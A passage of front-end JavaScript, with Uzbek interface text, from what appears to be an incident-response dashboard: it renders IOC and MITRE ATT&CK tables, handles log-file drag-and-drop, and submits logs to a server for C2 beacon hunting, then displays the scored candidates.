                <div style="padding: 16px 20px; border-bottom: 1px solid var(--border-card); font-weight: 700; font-size: 16px; color: var(--cyber-mint);">
                    🎯 Aniq Dalillar va IOC'lar (${iocs.length} ta)
                </div>
                <table class="data-table" style="margin: 0;">
                    <thead>
                        <tr>
                            <th>IOC Qiymati</th>
                            <th>Turi</th>
                            <th>Roli</th>
                            <th>Tavsif</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${iocsHtml}
                    </tbody>
                </table>
            </div>

            <div class="card card-hud" style="padding: 0; overflow-x: auto;">
                <div style="padding: 16px 20px; border-bottom: 1px solid var(--border-card); font-weight: 700; font-size: 16px; color: var(--neon-cyan);">
                    🗺 MITRE ATT&amp;CK Matritsasi (${mitre.length} texnika)
                </div>
                <table class="data-table" style="margin: 0;">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Texnika Nomi</th>
                            <th>Faza</th>
                            <th>Status</th>
                            <th>Soni</th>
                            <th>Namuna Dalil</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${mitreHtml}
                    </tbody>
                </table>
            </div>
        </div>
    `;
}


// ==================== IR: bir nechta fayl + drag & drop ====================
function irRenderFileList() {
    const input = document.getElementById('ir-log-file');
    const box = document.getElementById('ir-file-list');
    if (!input || !box) return;
    const files = input.files || [];
    if (!files.length) { box.innerHTML = ''; return; }
    let total = 0;
    let rows = '';
    for (let f of files) {
        total += f.size;
        rows += `<span class="ir-file-chip">\u{1F4C4} ${escapeHtml(f.name)} <b>${(f.size/1048576).toFixed(1)} MB</b></span>`;
    }
    box.innerHTML = `<div style="margin-top:10px;">${rows}
        <div class="helper-text" style="margin:6px 0 0 0;">${files.length} ta fayl tanlandi, jami ${(total/1048576).toFixed(1)} MB \u2014 birgalikda bitta zanjirga birlashtiriladi.</div></div>`;
}

function irClearFiles() {
    const input = document.getElementById('ir-log-file');
    if (input) input.value = '';
    irRenderFileList();
}

function setupIRDropzone() {
    const zone = document.getElementById('ir-dropzone');
    const input = document.getElementById('ir-log-file');
    if (!zone || !input) return;

    input.addEventListener('change', irRenderFileList);

    ['dragenter', 'dragover'].forEach(ev => {
        zone.addEventListener(ev, e => {
            e.preventDefault();
            e.stopPropagation();
            zone.classList.add('dropzone-active');
        });
    });
    ['dragleave', 'drop'].forEach(ev => {
        zone.addEventListener(ev, e => {
            e.preventDefault();
            e.stopPropagation();
            if (ev === 'dragleave' && zone.contains(e.relatedTarget)) return;
            zone.classList.remove('dropzone-active');
        });
    });

    zone.addEventListener('drop', e => {
        const dropped = e.dataTransfer && e.dataTransfer.files ? e.dataTransfer.files : null;
        if (!dropped || !dropped.length) return;
        try {
            const dt = new DataTransfer();
            for (let f of input.files) dt.items.add(f);   // avval tanlanganlari saqlanadi
            for (let f of dropped) dt.items.add(f);
            input.files = dt.files;
        } catch (err) {
            input.files = dropped;                        // eski brauzerlar uchun zaxira
        }
        irRenderFileList();
        showToast(`${dropped.length} ta fayl qo'shildi`, 'success');
    });

    // butun sahifaga tashlab yuborilsa brauzer faylni ochib yubormasin
    ['dragover', 'drop'].forEach(ev => {
        window.addEventListener(ev, e => {
            if (!zone.contains(e.target)) e.preventDefault();
        });
    });
}

// Auto-run on startup
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        initClock();
        initCyberCanvas();
        setupIRDropzone();
    });
} else {
    initClock();
    initCyberCanvas();
    setupIRDropzone();
}




// --- C2 HUNT ---
let huntFiles = [];
const huntDropzone = document.getElementById('hunt-dropzone');
const huntFileInput = document.getElementById('hunt-file');
const huntFileList = document.getElementById('hunt-file-list');
let lastHuntData = null;

if (huntDropzone) {
    huntDropzone.addEventListener('click', () => huntFileInput.click());
    huntDropzone.addEventListener('dragover', (e) => { e.preventDefault(); huntDropzone.classList.add('dragover'); });
    huntDropzone.addEventListener('dragleave', () => huntDropzone.classList.remove('dragover'));
    huntDropzone.addEventListener('drop', (e) => {
        e.preventDefault();
        huntDropzone.classList.remove('dragover');
        if (e.dataTransfer.files.length > 0) handleHuntFiles(e.dataTransfer.files);
    });
    huntFileInput.addEventListener('change', (e) => {
        if (e.target.files.length > 0) handleHuntFiles(e.target.files);
    });
}

function handleHuntFiles(files) {
    for (let f of files) {
        if (f.size > 20 * 1024 * 1024) {
            showToast(f.name + " fayli 20MB dan katta", true);
            continue;
        }
        let reader = new FileReader();
        reader.onload = (e) => {
            huntFiles.push({ filename: f.name, content: e.target.result });
            renderHuntFileList();
        };
        reader.readAsText(f);
    }
}

function renderHuntFileList() {
    huntFileList.innerHTML = '';
    huntFiles.forEach((f, i) => {
        let div = document.createElement('div');
        div.className = 'file-item';
        div.innerHTML = `<span>📄 ${f.filename}</span><span style="color:var(--crimson);cursor:pointer;" onclick="huntFiles.splice(${i}, 1); renderHuntFileList();">✖</span>`;
        huntFileList.appendChild(div);
    });
}

function huntClearFiles() {
    huntFiles = [];
    renderHuntFileList();
    document.getElementById('hunt-path').value = '';
}

async function runHuntBeacons() {
    let p = document.getElementById('hunt-path').value.trim();
    if (huntFiles.length === 0 && !p) {
        showToast("Fayl(lar)ni yuklang yoki yo'lni ko'rsating", true);
        return;
    }
    
    let btn = document.getElementById('hunt-btn');
    btn.disabled = true;
    let oldTxt = btn.innerText;
    btn.innerHTML = '<span class="spinner"></span> Ishlanmoqda...';
    
    document.getElementById('hunt-error').style.display = 'none';
    document.getElementById('hunt-result').style.display = 'none';
    
    let payload = {
        min_sessions: parseInt(document.getElementById('hunt-min-sessions').value) || 10,
        max_hosts: parseInt(document.getElementById('hunt-max-hosts').value) || 100,
        all: document.getElementById('hunt-all').checked,
        iocs: document.getElementById('hunt-ioc').value.trim()
    };
    
    if (huntFiles.length > 0) {
        payload.files = huntFiles;
    } else {
        payload.path = p;
    }
    
    try {
        let res = await fetch('/api/hunt/beacons', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
        let data = await res.json();
        if (!res.ok) {
            throw new Error(data.error || 'Server xatosi');
        }
        lastHuntData = data;
        renderHuntResults(data);
        showToast("Tahlil yakunlandi");
    } catch(err) {
        document.getElementById('hunt-error').innerText = err.message;
        document.getElementById('hunt-error').style.display = 'block';
    }
    
    btn.disabled = false;
    btn.innerText = oldTxt;
}

function renderHuntResults(data) {
    let summary = data.summary;
    let cands = data.candidates;
    
    document.getElementById('hunt-summary-title').innerText = `${summary.checked} ta nomzod tekshirildi, ${summary.high_medium} tasi YUQORI/O'RTA.`;
    if(summary.tz_note) document.getElementById('hunt-tz-note').innerText = summary.tz_note;
    
    let tbody = document.querySelector('#hunt-table tbody');
    tbody.innerHTML = '';
    
    cands.forEach(c => {
        let tr = document.createElement('tr');
        
        let color = 'var(--text-primary)';
        if(c.level === 'YUQORI') color = 'var(--cyber-red)';
        else if(c.level === "O'RTA") color = 'var(--cyber-amber)';
        else if(c.level === "MA'LUM") color = 'var(--neon-cyan)';
        else if(c.level === "PAST") color = 'var(--text-muted)';
        
        let cvStr = c.cv_ratio !== null ? c.cv_ratio.toFixed(2) : '-';
        let medStr = c.median_interval ? c.median_interval.toFixed(0) + 's' : '-';
        
        let avgStr = formatBytesJS(c.avg_sent);
        let durStr = formatDurationJS(c.max_duration);
        let scoreStr = c.score === 999 ? '-' : c.score;
        
        tr.innerHTML = `
            <td>${scoreStr}</td>
            <td style="color:${color}; font-weight:bold;">${c.level}</td>
            <td style="font-family:monospace;">${c.dst_ip}</td>
            <td>${c.dst_port}</td>
            <td>${c.dst_host_count}</td>
            <td>${c.sessions}</td>
            <td>${medStr}</td>
            <td>${cvStr}</td>
            <td>${avgStr}</td>
            <td>${durStr}</td>
            <td>${c.first_seen}</td>
        `;
        tbody.appendChild(tr);
        
        if (c.hosts && c.hosts.length > 0) {
            let trHosts = document.createElement('tr');
            let tdHosts = document.createElement('td');
            tdHosts.colSpan = 11;
            tdHosts.style.padding = '0.5rem 1rem 1rem 3rem';
            tdHosts.style.backgroundColor = 'var(--bg-card)';
            tdHosts.style.borderBottom = '1px solid var(--border-card)';
            
            let html = '';
            c.hosts.forEach(h => {
                let hname = h.host ? ` (${h.host})` : '';
                if (h.sessions === 0) {
                    html += `<div style="color:var(--text-muted); font-family:monospace;">&rarr; ${h.src_ip}${hname} (ESET, sessiya yo'q)</div>`;
                } else {
                    html += `<div style="color:var(--text-dim); font-family:monospace;">&rarr; ${h.src_ip}${hname} &mdash; ${h.sessions} sessiya</div>`;
                }
            });
            tdHosts.innerHTML = html;
            trHosts.appendChild(tdHosts);
            tbody.appendChild(trHosts);
        }
    });
    
    document.getElementById('hunt-result').style.display = 'block';
}

function downloadHuntJson() {
    if (!lastHuntData) return;
    downloadBlob(JSON.stringify(lastHuntData, null, 2), 'hunt_results.json', 'application/json');
}

function formatBytesJS(bytes) {
    if (!bytes || bytes === 0) return "0 B";
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function formatDurationJS(seconds) {
    if (!seconds || seconds === 0) return "0s";
    if (seconds < 60) return seconds.toFixed(0) + "s";
    let m = seconds / 60;
    if (m < 60) return m.toFixed(1) + "m";
    let h = m / 60;
    if (h < 24) return h.toFixed(1) + " soat";
    let d = h / 24;
    return d.toFixed(1) + " kun";
}
